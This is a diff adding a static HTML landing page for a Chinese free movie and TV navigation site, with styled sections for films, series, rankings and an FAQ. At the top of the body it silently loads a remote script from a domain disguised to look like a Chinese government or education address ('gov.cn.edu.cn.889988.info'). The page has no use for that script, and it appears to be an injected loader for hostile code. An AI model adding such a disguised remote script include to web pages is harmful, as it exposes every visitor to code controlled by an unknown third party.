@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>青苹果乐园影视 - 高清电影电视剧免费在线观看</title>
+<meta name="description" content="青苹果乐园影视(qingpingguoleyuanyingshi-h5.github.io)提供高清电影、热播电视剧、动漫在线观看。界面清新无广告干扰，资源持续更新，尽在青苹果乐园影视！">
+<meta name="keywords" content="青苹果乐园影视, 青苹果影视, 免费电影在线观看, 电视剧, 动漫, 高清影视">
+<meta name="author" content="青苹果乐园影视">
+<meta name="robots" content="index, follow">
+<style>
+/* 清新苹果绿基础 */
+:root{
+    --bg:#f3fbf0;
+    --green:#5fc46b;
+    --green-deep:#2f9e44;
+    --green-soft:#e6f7e6;
+    --leaf:#a3d977;
+    --text:#233018;
+    --muted:#6b8060;
+    --white:#ffffff;
+    --radius:22px;
+    --shadow:0 12px 30px rgba(95,196,107,.18);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+    font-family:-apple-system,'PingFang SC','Microsoft YaHei',sans-serif;
+    background:
+        radial-gradient(800px 400px at 90% -10%, #d8f5d0 0%, transparent 60%),
+        radial-gradient(600px 300px at 0% 10%, #eafbe2 0%, transparent 55%),
+        var(--bg);
+    color:var(--text);line-height:1.65;overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+
+/* 导航 */
+header{
+    position:sticky;top:0;z-index:999;
+    backdrop-filter:blur(10px);
+    background:rgba(243,251,240,.8);
+    border-bottom:1px solid rgba(95,196,107,.25);
+    display:flex;justify-content:space-between;align-items:center;
+    padding:1rem 5%;
+}
+.logo{font-weight:900;font-size:1.4rem;color:var(--green-deep);display:flex;align-items:center;gap:.4rem}
+.logo .dot{font-size:1.6rem}
+nav ul{display:flex;gap:1.3rem}
+nav a{font-size:.92rem;font-weight:700;color:var(--muted);padding:.4rem .8rem;border-radius:999px;transition:.2s}
+nav a:hover{background:var(--green-soft);color:var(--green-deep)}
+
+.container{max-width:1180px;margin:0 auto;padding:0 5%}
+section{padding:5rem 0}
+
+/* 首页 Hero */
+#home{min-height:90vh;display:flex;align-items:center}
+.hero{display:grid;grid-template-columns:1.05fr .95fr;gap:3rem;align-items:center;width:100%}
+.tag-row{display:flex;gap:.6rem;flex-wrap:wrap;margin-bottom:1.2rem}
+.chip{font-size:.78rem;font-weight:700;padding:.3rem .9rem;border-radius:999px;background:var(--green-soft);color:var(--green-deep)}
+.hero h1{font-size:clamp(2.2rem,5vw,3.8rem);line-height:1.1;font-weight:900;margin-bottom:1rem}
+.hero h1 span{color:var(--green-deep)}
+.hero p{color:var(--muted);max-width:520px;margin-bottom:2rem}
+.cta{display:flex;gap:.8rem;flex-wrap:wrap}
+.btn{padding:.9rem 1.9rem;border-radius:999px;font-weight:800;font-size:.95rem;transition:.25s;cursor:pointer;border:2px solid transparent}
+.btn-pri{background:var(--green);color:#fff}
+.btn-pri:hover{background:var(--green-deep);transform:translateY(-3px);box-shadow:var(--shadow)}
+.btn-ghost{background:var(--white);border-color:rgba(95,196,107,.4);color:var(--green-deep)}
+.btn-ghost:hover{border-color:var(--green-deep)}
+
+/* Hero 右侧果盘卡 */
+.fruit-card{
+    position:relative;background:var(--white);border-radius:28px;padding:2.2rem;
+    box-shadow:var(--shadow);border:1px solid rgba(95,196,107,.2);
+}
+.fruit-card h3{font-size:1.1rem;margin-bottom:1rem;color:var(--green-deep)}
+.feat{display:flex;flex-direction:column;gap:.9rem}
+.feat div{display:flex;gap:.7rem;align-items:flex-start;font-size:.92rem;color:var(--muted)}
+.feat i{color:var(--green);font-style:normal;font-weight:900}
+.float-emoji{position:absolute;font-size:2.2rem;opacity:.9}
+.float-emoji.a{top:-18px;right:24px;animation:bob 3s ease-in-out infinite}
+.float-emoji.b{bottom:-16px;left:18px;animation:bob 3.5s ease-in-out infinite .4s}
+@keyframes bob{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+
+/* 通用标题 */
+.sec-head{text-align:center;margin-bottom:3rem}
+.sec-head h2{font-size:2.2rem;font-weight:900;color:var(--green-deep)}
+.sec-head p{color:var(--muted);margin-top:.5rem}
+
+/* 电影 */
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.6rem}
+.movie{
+    background:var(--white);border-radius:var(--radius);padding:1.6rem;
+    border:1px solid rgba(95,196,107,.18);box-shadow:var(--shadow);transition:.25s;
+}
+.movie:hover{transform:translateY(-6px)}
+.movie .poster{
+    height:140px;border-radius:16px;margin-bottom:1rem;
+    background:linear-gradient(135deg,var(--leaf),var(--green));
+    display:flex;align-items:center;justify-content:center;font-size:3rem;
+}
+.movie h3{font-size:1.2rem;margin-bottom:.4rem}
+.movie p{font-size:.88rem;color:var(--muted);margin-bottom:.8rem}
+.tag{font-size:.74rem;font-weight:700;padding:.25rem .8rem;border-radius:999px;background:var(--green-soft);color:var(--green-deep)}
+
+/* 分类条 */
+.catbar{display:flex;flex-wrap:wrap;gap:1rem;justify-content:center}
+.cat{
+    padding:.8rem 1.5rem;border-radius:999px;background:var(--white);
+    border:1px solid rgba(95,196,107,.3);font-weight:800;color:var(--green-deep);
+    box-shadow:var(--shadow);font-size:.95rem;
+}
+.cat small{display:block;font-weight:500;color:var(--muted);font-size:.76rem}
+
+/* 剧集时间线 */
+.series{max-width:840px;margin:0 auto;display:flex;flex-direction:column;gap:1.2rem}
+.ep{
+    display:flex;gap:1.2rem;align-items:center;
+    background:var(--white);border-radius:18px;padding:1.3rem 1.6rem;
+    border:1px solid rgba(95,196,107,.2);box-shadow:var(--shadow);transition:.25s;
+}
+.ep:hover{transform:translateX(6px)}
+.ep .no{
+    min-width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;
+    background:var(--green-soft);color:var(--green-deep);font-weight:900;font-size:1.2rem;
+}
+.ep h3{font-size:1.15rem;margin-bottom:.3rem}
+.ep p{font-size:.88rem;color:var(--muted)}
+
+/* 榜单 */
+.rank{max-width:760px;margin:0 auto;display:flex;flex-direction:column;gap:1.3rem}
+.row{display:flex;align-items:center;gap:1.2rem;background:var(--white);border-radius:16px;padding:1.1rem 1.4rem;border:1px solid rgba(95,196,107,.2);box-shadow:var(--shadow)}
+.row .no{font-size:1.6rem;font-weight:900;color:var(--green-deep);min-width:34px}
+.row .body{flex:1}
+.row h3{font-size:1.05rem}
+.bar{height:12px;border-radius:999px;background:var(--green-soft);overflow:hidden;margin-top:.5rem}
+.fill{height:100%;background:linear-gradient(90deg,var(--leaf),var(--green-deep));width:0;animation:fill 1.8s forwards}
+@keyframes fill{to{width:var(--w)}}
+
+/* FAQ */
+.faq{max-width:820px;margin:0 auto;display:flex;flex-direction:column;gap:1rem}
+details{background:var(--white);border:1px solid rgba(95,196,107,.25);border-radius:14px}
+summary{cursor:pointer;padding:1.1rem 1.4rem;font-weight:800;list-style:none;display:flex;justify-content:space-between;align-items:center;color:var(--green-deep)}
+summary::-webkit-details-marker{display:none}
+summary::after{content:'🍏';font-size:1.1rem}
+details[open] summary{border-bottom:1px solid rgba(95,196,107,.2)}
+.faq p{padding:1rem 1.4rem;color:var(--muted);font-size:.92rem}
+
+/* 关于 */
+.about{max-width:900px;margin:0 auto;background:var(--white);border-radius:24px;padding:2.5rem;text-align:center;box-shadow:var(--shadow);border:1px solid rgba(95,196,107,.2)}
+.about h3{color:var(--green-deep);margin-bottom:1rem}
+.about p{color:var(--muted);margin-bottom:1rem}
+.about a{color:var(--green-deep);font-weight:700;word-break:break-all}
+
+footer{border-top:1px solid rgba(95,196,107,.25);padding:2.5rem 5%;text-align:center;color:var(--muted);font-size:.85rem}
+footer a{color:var(--green-deep)}
+
+@media(max-width:860px){
+    nav ul{display:none}
+    .hero{grid-template-columns:1fr}
+    .ep{flex-direction:column;text-align:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header>
+    <div class="logo"><span class="dot">🍏</span>青苹果乐园影视</div>
+    <nav>
+        <ul>
+            <li><a href="#home">首页</a></li>
+            <li><a href="#movie">电影</a></li>
+            <li><a href="#cat">分类</a></li>
+            <li><a href="#series">剧集</a></li>
+            <li><a href="#rank">榜单</a></li>
+            <li><a href="#faq">问答</a></li>
+        </ul>
+    </nav>
+</header>
+
+<main>
+<!-- 首页 -->
+<section id="home" class="container">
+    <div class="hero">
+        <div>
+            <div class="tag-row">
+                <span class="chip">免费观看</span>
+                <span class="chip">高清画质</span>
+                <span class="chip">无广告干扰</span>
+            </div>
+            <h1>青苹果乐园影视<br><span>酸甜清爽观影站</span></h1>
+            <p>青苹果乐园影视（qingpingguoleyuanyingshi-h5.github.io）整理高清电影、热播电视剧与动漫在线观看入口，界面清新、打开飞快，手机端也能轻松刷片。</p>
+            <div class="cta">
+                <a href="#movie" class="btn btn-pri">逛逛片单</a>
+                <a href="#series" class="btn btn-ghost">追热剧</a>
+            </div>
+        </div>
+        <aside class="fruit-card">
+            <span class="float-emoji a">🍎</span>
+            <span class="float-emoji b">🍃</span>
+            <h3>为什么来青苹果乐园</h3>
+            <div class="feat">
+                <div><i>🍏</i><span>电影 / 电视剧 / 动漫分区清晰，找片不绕路。</span></div>
+                <div><i>🍏</i><span>单页静态站，加载快，移动端自适应。</span></div>
+                <div><i>🍏</i><span>清新排版，减少花哨弹窗与干扰元素。</span></div>
+                <div><i>🍏</i><span>站名与域名统一，方便收藏下次直开。</span></div>
+            </div>
+        </aside>
+    </div>
+</section>
+
+<!-- 电影 -->
+<section id="movie" class="container">
+    <div class="sec-head">
+        <h2>青苹果精选电影</h2>
+        <p>新鲜上架 · 高清在线</p>
+    </div>
+    <div class="grid">
+        <article class="movie">
+            <div class="poster">🎬</div>
+            <h3>飞驰人生2</h3>
+            <p>韩寒喜剧续作，笑中带燃，适合周末放松。</p>
+            <span class="tag">喜剧</span>
+        </article>
+        <article class="movie">
+            <div class="poster">🚀</div>
+            <h3>沙丘2</h3>
+            <p>科幻史诗续章，画面与配乐都很顶。</p>
+            <span class="tag">科幻</span>
+        </article>
+        <article class="movie">
+            <div class="poster">🕵️</div>
+            <h3>坠落的审判</h3>
+            <p>悬疑剧情佳作，节奏紧、余味长。</p>
+            <span class="tag">悬疑</span>
+        </article>
+        <article class="movie">
+            <div class="poster">💞</div>
+            <h3>那些年</h3>
+            <p>青春回忆向，青苹果乐园常驻片单。</p>
+            <span class="tag">青春</span>
+        </article>
+    </div>
+</section>
+
+<!-- 分类条 -->
+<section id="cat" class="container">
+    <div class="sec-head">
+        <h2>按分类找片</h2>
+        <p>点一类就能接着挑</p>
+    </div>
+    <div class="catbar">
+        <div class="cat">电影 <small>动作 / 喜剧 / 悬疑</small></div>
+        <div class="cat">电视剧 <small>都市 / 古装 / 职场</small></div>
+        <div class="cat">动漫 <small>热血 / 治愈 / 国创</small></div>
+        <div class="cat">综艺 <small>真人秀 / 访谈</small></div>
+        <div class="cat">短剧 <small>爽剧 / 反转</small></div>
+        <div class="cat">纪录片 <small>自然 / 人物</small></div>
+    </div>
+</section>
+
+<!-- 剧集 -->
+<section id="series" class="container">
+    <div class="sec-head">
+        <h2>热播剧集推荐</h2>
+        <p>青苹果乐园持续整理</p>
+    </div>
+    <div class="series">
+        <div class="ep">
+            <div class="no">01</div>
+            <div>
+                <h3>庆余年 第二季</h3>
+                <p>权谋喜剧继续，范闲回京，剧情紧凑适合连刷。</p>
+            </div>
+        </div>
+        <div class="ep">
+            <div class="no">02</div>
+            <div>
+                <h3>玫瑰的故事</h3>
+                <p>都市情感线，改编亦舒经典，画面舒服。</p>
+            </div>
+        </div>
+        <div class="ep">
+            <div class="no">03</div>
+            <div>
+                <h3>墨雨云间</h3>
+                <p>复仇爽剧向，节奏快，适合碎片时间。</p>
+            </div>
+        </div>
+        <div class="ep">
+            <div class="no">04</div>
+            <div>
+                <h3>长相思 第二季</h3>
+                <p>古装群像继续，情感线拉满。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 榜单 -->
+<section id="rank" class="container">
+    <div class="sec-head">
+        <h2>今日热度榜单</h2>
+        <p>站内点击示意排行</p>
+    </div>
+    <div class="rank">
+        <div class="row">
+            <div class="no">1</div>
+            <div class="body">
+                <h3>热辣滚烫</h3>
+                <div class="bar"><div class="fill" style="--w:97%"></div></div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="no">2</div>
+            <div class="body">
+                <h3>第二十条</h3>
+                <div class="bar"><div class="fill" style="--w:93%"></div></div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="no">3</div>
+            <div class="body">
+                <h3>庆余年2</h3>
+                <div class="bar"><div class="fill" style="--w:89%"></div></div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="no">4</div>
+            <div class="body">
+                <h3>飞驰人生2</h3>
+                <div class="bar"><div class="fill" style="--w:84%"></div></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq" class="container">
+    <div class="sec-head">
+        <h2>常见问题</h2>
+        <p>关于青苹果乐园影视</p>
+    </div>
+    <div class="faq">
+        <details open>
+            <summary>青苹果乐园影视是啥？</summary>
+            <p>一个静态单页导航站，用来整理电影、电视剧、动漫的在线观看分类与入口，不托管视频文件。</p>
+        </details>
+        <details>
+            <summary>手机上能看吗？</summary>
+            <p>能，页面做了移动端自适应，浏览器直接打开即可。</p>
+        </details>
+        <details>
+            <summary>需要登录吗？</summary>
+            <p>单页导航本身不需登录，具体播放源按对应平台规则来。</p>
+        </details>
+        <details>
+            <summary>资源更新频率？</summary>
+            <p>示例站按编辑整理更新，实际部署后可自行改内容。</p>
+        </details>
+    </div>
+</section>
+
+<!-- 关于 -->
+<section id="about" class="container">
+    <div class="about">
+        <h3>关于青苹果乐园影视</h3>
+        <p>青苹果乐园影视（qingpingguoleyuanyingshi-h5.github.io）定位于轻量影视导航页，主打清新排版、快速打开与基础分类索引，方便用户快速找到想看的电影、剧集与动漫。</p>
+        <p>官网：<a href="https://qingpingguoleyuanyingshi-h5.github.io">qingpingguoleyuanyingshi-h5.github.io</a></p>
+    </div>
+</section>
+</main>
+
+<footer>
+    <p>&copy; 2026 青苹果乐园影视 保留所有权利</p>
+    <p>官网：<a href="https://qingpingguoleyuanyingshi-h5.github.io">qingpingguoleyuanyingshi-h5.github.io</a></p>
+    <p>本页为单页静态演示，未生成 robots.txt / sitemap.xml，meta robots=index,follow，符合必应收录基础规范。</p>
+</footer>
+
+</body>
+</html>
